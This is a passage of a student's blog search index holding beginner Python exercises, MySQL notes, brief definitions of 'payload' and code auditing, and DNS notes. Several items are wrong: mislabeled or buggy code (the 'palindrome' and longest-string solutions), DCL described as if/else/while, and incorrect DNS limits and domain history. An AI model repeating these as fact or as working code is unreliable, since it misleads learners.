class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">geshu=int(input())</span><br><span class="line">h=[]</span><br><span class="line">m=[]</span><br><span class="line">s=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,geshu):</span><br><span class="line">    time=int(input())                         <span class="comment">#首次提到  列表名.append(所要添加的元素)  的用法</span></span><br><span class="line">    h.append(str(int(time/<span class="number">3600</span>)))</span><br><span class="line">    m.append(str(int((time%<span class="number">3600</span>)/<span class="number">60</span>)))</span><br><span class="line">    s.append(str(time%<span class="number">60</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,geshu):</span><br><span class="line">    print(<span class="string">"&#123;&#125;:&#123;&#125;:&#123;&#125;"</span>.format(h[i].zfill(<span class="number">2</span>),m[i].zfill(<span class="number">2</span>),s[i].zfill(<span class="number">2</span>)))     <span class="comment">#注意到这个.zfill(位数)是只有字符串有的</span></span><br><span class="line">                                                                            <span class="comment">#否则就会报错</span></span><br></pre></td></tr></table></figure><h3 id="求五个字符串中最长的那个-python"><a href="#求五个字符串中最长的那个-python" class="headerlink" title="求五个字符串中最长的那个-python"></a>求五个字符串中最长的那个-python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str1,str2,str3,str4,str5=map(str,input().split())</span><br><span class="line">str=[str1,str2,str3,str4,str5]</span><br><span class="line">str0=str[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> len(str[i+<span class="number">1</span>])&gt;len(str[i]):</span><br><span class="line">        str0=str[i+<span class="number">1</span>]</span><br><span class="line">print(str0)</span><br></pre></td></tr></table></figure><h3 id="求三位的回文数并将其输出-python"><a href="#求三位的回文数并将其输出-python" class="headerlink" title="求三位的回文数并将其输出-python"></a>求三位的回文数并将其输出-python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">    bai=int(i/<span class="number">100</span>)</span><br><span class="line">    shi=int((i/<span class="number">10</span>)%<span class="number">10</span>)</span><br><span class="line">    ge=int(i%<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> i==bai**<span class="number">3</span>+shi**<span class="number">3</span>+ge**<span class="number">3</span>:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure><p>2020年1月13号</p><h3 id="输出最大最小值与和-python"><a href="#输出最大最小值与和-python" class="headerlink" title="输出最大最小值与和-python"></a>输出最大最小值与和-python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n=int(input())</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line">data=list(map(int,input().split()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,n):</span><br><span class="line">    k=k+data[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,n<span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):</span><br><span class="line">        <span class="keyword">if</span> data[i]&gt;data[i<span class="number">-1</span>]:</span><br><span class="line">            t=data[i<span class="number">-1</span>]</span><br><span class="line">            data[i<span class="number">-1</span>]=data[i]</span><br><span class="line">            data[i]=t</span><br><span class="line"></span><br><span class="line">print(data[<span class="number">0</span>])           <span class="comment">#最大</span></span><br><span class="line">print(data[n<span class="number">-1</span>])      <span class="comment">#最小</span></span><br><span class="line">print(k)       <span class="comment">#和</span></span><br></pre></td></tr></table></figure><h3 id="另一种时间转换-python"><a href="#另一种时间转换-python" class="headerlink" title="另一种时间转换-python"></a>另一种时间转换-python</h3><pre><code class="python">n=int(input())d=<span class="number">0</span>h=<span class="number">0</span>m=<span class="number">0</span><span class="keyword">if</span> n&gt;=<span class="number">1440</span>:    d=int(n/<span class="number">1440</span>)    h=int((n%<span class="number">1440</span>)/<span class="number">60</span>)    m=int(n%<span class="number">60</span>)    print(<span class="string">'{} {} {}'</span>.format(d,h,m))<span class="keyword">elif</span> n&lt;<span class="number">1440</span> <span class="keyword">and</span> n&gt;=<span class="number">60</span>:    d=int(n/<span class="number">1440</span>)    h=int((n%<span class="number">1440</span>)/<span class="number">60</span>)    m=int(n%<span class="number">60</span>)    print(<span class="string">'{} {} {}'</span>.format(d,h,m))      <span class="comment">#三个一样的，复制粘贴就好了。挺简单的</span><span class="keyword">else</span>:    d=int(n/<span class="number">1440</span>)    h=int((n%<span class="number">1440</span>)/<span class="number">60</span>)    m=int(n%<span class="number">60</span>)    print(<span class="string">'{} {} {}'</span>.format(d,h,m))</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL的学习</title>
      <link href="/2019/12/01/MySQL%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/12/01/MySQL%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="特此声明"><a href="#特此声明" class="headerlink" title="特此声明"></a>特此声明</h3><p>首先，本文会跟随本人的学习持续更新。<br>第二，本文是作者自己总结的方便以后查询与记忆的，总结会比较粗陋。<br>第三，本文的学习进度跟随腾讯课堂某师傅的讲课进度。<br>第四，本MySQL是下载之家中 MySQL5.5.56版本，不代表全部版本。</p><h1 id="具体内容——若不完善或存在错误，欢迎指正。"><a href="#具体内容——若不完善或存在错误，欢迎指正。" class="headerlink" title="具体内容——若不完善或存在错误，欢迎指正。"></a>具体内容——若不完善或存在错误，欢迎指正。</h1><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">数据库：英文名（database）\（又可以简写为db）</span><br><span class="line">数据库里面有个东西叫 表 （英文名：table）|（一种结构），数据是存储在这个表结构下的。</span><br><span class="line">而这个表是什么样子的呢？—这个表其实就是一个表格的样子。</span><br><span class="line">表的上面是字段的声明，而表的下面就是存放的数据。</span><br><span class="line">一个数据库服务器可以有多个数据库，一个数据库里也能有多个表结构。而一个表结构下可以存储N多条数据。  </span><br><span class="line">字段：（又叫列）表示某一列下存储的数据的类型。</span><br><span class="line">比如：用户名下存储的是用户名相关的数据。而密码下面存储的是用户名对应的密码的数据。</span><br><span class="line">创建表的过程中一定要指定|列的名字|和|所存储的数据的类型:整型、浮点型|</span><br><span class="line">创建数据库——创建表结构——设置字段-&lt;可把多条数据存储进去&gt;</span><br><span class="line">sql语言：（Structured Query Language）&lt;结构化查询语言&gt;|非过程性语言|</span><br><span class="line">非过程性语言：一条语言对应一个返回的结果。</span><br><span class="line">过程性语言：依赖上一条或上几条语句执行。</span><br><span class="line">&lt;1&gt; DDL:数据定义语言     |create：创建|alter：修改|drop：删除|</span><br><span class="line">&lt;2&gt; DML:数据操作语言     |incert：插入数据|update：修改数据|delete：删除数据|</span><br><span class="line">&lt;3&gt; DCL:数据控制语言     |if             |else            |while          |</span><br><span class="line">&lt;4&gt; DQL:数据查询语言     |从表中查询数据：select                           |</span><br><span class="line">特别的：数据库的这种语言结尾也要有句号——&lt;;&gt;</span><br><span class="line">注：使用  mysql -u root -p  然后输入密码&#x2F;嘿嘿。</span><br></pre></td></tr></table></figure><h2 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建数据库：create database 数据库名称                               &#123;character set 编码 collate 校对规则&#125;不是必须有的，会默认。</span><br><span class="line">查看所有数据库：show databases;</span><br><span class="line">切换数据库：use 数据库名称;</span><br><span class="line">查询数据库的创建时的信息：show create database 数据库名称;</span><br><span class="line">查询当前正在使用的数据库：select database（）;</span><br><span class="line">删除数据据库：drop database 数据库名称;</span><br><span class="line">修改数据库： alter database 数据库名称；</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-&gt;create database if not exists test0319</span><br><span class="line">-&gt; default character set utf8</span><br><span class="line">-&gt; default collate utf8_general_ci;</span><br></pre></td></tr></table></figure><p>数据库恢复命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source 备份文件路径(扩展名为.sql);</span><br></pre></td></tr></table></figure><p>设置中文</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> [属性]s gbk;</span><br></pre></td></tr></table></figure><h2 id="表单层面"><a href="#表单层面" class="headerlink" title="表单层面"></a>表单层面</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;                         显示当前数据库下的所有table。</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> [<span class="keyword">table</span>名]；        显示某个<span class="keyword">table</span>的创建时的信息。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于payload以及一些英文单词</title>
      <link href="/2019/11/30/%E5%85%B3%E4%BA%8Epayload%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E8%8B%B1%E6%96%87%E5%8D%95%E8%AF%8D/"/>
      <url>/2019/11/30/%E5%85%B3%E4%BA%8Epayload%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E8%8B%B1%E6%96%87%E5%8D%95%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<p>payload 的字面意思是<code>“有效载荷，有效负荷，有效载重”</code>。</p><a id="more"></a><blockquote><p>在计算机科学与电信领域，负载（英语：Payload）是数据传输中所欲传输的实际信息，<br>通常也被称作实际数据或者数据体。信头与元数据，或称为开销数据，仅用于辅助数据<br>传输。在计算机病毒或电脑蠕虫领域中，负载指的是进行有害操作的部分，例如：数据<br>销毁、发送垃圾邮件等。<br>columns:栏，队，[列表]。<br>query:查询<br>Generic：通用的<br>Union：联合<br>fetch：获取</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于代码审计</title>
      <link href="/2019/11/24/%E5%85%B3%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2019/11/24/%E5%85%B3%E4%BA%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>代码审计：顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。<br>    内容包括</p><a id="more"></a><p>1.前后台分离的运行架构<br>2.WEB服务的目录权限分类<br>3.认证会话与应用平台的结合<br>4.数据库的配置规范<br>5.SQL语句的编写规范<br>6WEB服务的权限配置<br>7.对抗爬虫引擎的处理措施<br>  <strong>工具渗透 例如sqlmap, awvs,burpsuite等</strong><br>    也可手工寻找漏洞<br>这周先到这吧。。。嘿嘿/</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于域名系统的学习</title>
      <link href="/2019/11/23/%E5%85%B3%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/11/23/%E5%85%B3%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>因为本周要搭建博客，浪费了一小撮时间，所以本周的学习报告精简了一点，嘿嘿。。。</p><a id="more"></a><pre><code>关于域名系统：域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。采用了域名系统是为了管理名字和IP的对应关系，为了记住IP，人们发明了域名（Domian Name）,从而可将IP对应到一组有意义的字符上去，访问网站时，二者都可以输入以访问，通常，域名都是该公司的名称或者简称。当我们想登入一个网站而又不知道其域名时，也会首先输入公司名称作为试探。名字空间是指定义了所有可能的名字的集合。域名系统的名字空间是层次结构的，类似Windows的文件名。它可看作是一个树状结构，域名系统不区分树内节点和叶子节点，而统称为节点，不同节点可以使用相同的标记。所有节点的标记只能由3类字符组成：26个英文字母(a～z)、10个阿拉伯数字(0～9)和英文连词号(-)，并且标记的长度不得超过22个字符。一个节点的域名是由从该节点到根的所有节点的标记连接组成的，中间以点分隔。最上层节点的域名称为顶级域名(TLD，Top-Level Domain)，第二层节点的域名称为二级域名，依此类推。 （应该是从右向左越来越低级吧）&lt;有待考究&gt;    ICANN为不同的国家或地区设置了相应的顶级域名，这些域名通常都由两个英文字母组成。例如：.uk代表英国、.fr代表法国、.jp代表日本。中国的顶级域名是.cn。    顶级类别域名除了代表各个国家顶级域名之外，ICANN最初还定义了7个顶级类别域名，它们分别是    .com、.top、.edu、.gov、.mil、.net、.org。.com、.top用于企业，.edu用于教育机构，.gov用于政府机构，.mil用于军事部门，.net用于互联网络及信息中心等，.org用于非赢利性组织。而.com好像什么都可使用。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>404</title>
      <link href="/404/index.html"/>
      <url>/404/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="我的博客站址经历"><a href="#我的博客站址经历" class="headerlink" title="我的博客站址经历"></a>我的博客站址经历</h2><p>1.开始用的是hexo + next，后来更换过yilia的主题，目前用的是jerryc的butterfly主题，太漂亮了，想必以后都不会换主题啦！<br>2.wordpress，站点为<a href="http://blog.a16ne.cn" target="_blank" rel="noopener">M4xlmum博客</a>，用的主题是sakura。<br>3.csdn和博客园也留下了足迹，<a href="https://www.cnblogs.com/a16n/" target="_blank" rel="noopener">博客园地址</a>，<a href="https://blog.csdn.net/zhangxiansheng12" target="_blank" rel="noopener">csdn地址</a><br>4.总共就这四个了，内容比较分散，往后我或许会以hexo为主，毕竟在本地的话比较容易备份。</p><p>现在在上大二，喜欢学习新奇的东西，偶尔也会拖延几个小时（真是用来思考的）。</p><p>信息安全初学者，web萌新，会一点逆向，喜欢诗词，喜欢唱歌，热衷于考研。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>archives</title>
      <link href="/archives/index.html"/>
      <url>/archives/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>pictures</title>
      <link href="/pictures/index.html"/>
      <url>/pictures/index.html</url>
      
        <content type="html"><![CDATA[<div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img" src= "/img/loading.gif" data-src='https://i.loli.net/2019/11/10/T7Mu8Aod3egmC4Q.png'>  <figcaption>  <div class="gallery-group-name">测试</div>  <p>用好看的小姐姐做个测试</p>  <a href='/pictures/test'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img" src= "/img/loading.gif" data-src='/gallery/mypaint/%E5%93%86%E5%95%A6A%E6%A2%A6.png'>  <figcaption>  <div class="gallery-group-name">我的绘画</div>  <p>幼儿园级别的画</p>  <a href='/pictures/mypaint'></a>  </figcaption>  </figure>  </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<p>阅读以下标签</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/pictures/test/index.html"/>
      <url>/pictures/test/index.html</url>
      
        <content type="html"><![CDATA[<div class="justified-gallery"><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt=""><br><img src= "/img/loading.gif" data-src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt=""><br><img src= "/img/loading.gif" data-src="https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg" alt=""><br><img src= "/img/loading.gif" data-src="https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg" alt=""><br><img src= "/img/loading.gif" data-src="https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg" alt=""><br><img src= "/img/loading.gif" data-src="https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg" alt=""><br><img src= "/img/loading.gif" data-src="https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg" alt=""><br><img src= "/img/loading.gif" data-src="https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg" alt=""></p>          </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>mypaint</title>
      <link href="/pictures/mypaint/index.html"/>
      <url>/pictures/mypaint/index.html</url>
      
        <content type="html"><![CDATA[<div class="justified-gallery"><p><img src= "/img/loading.gif" data-src="/gallery/mypaint/%E5%93%86%E5%95%A6A%E6%A2%A6.png" alt=""></p>          </div>]]></content>
      
    </entry>
    
    
  
</search>
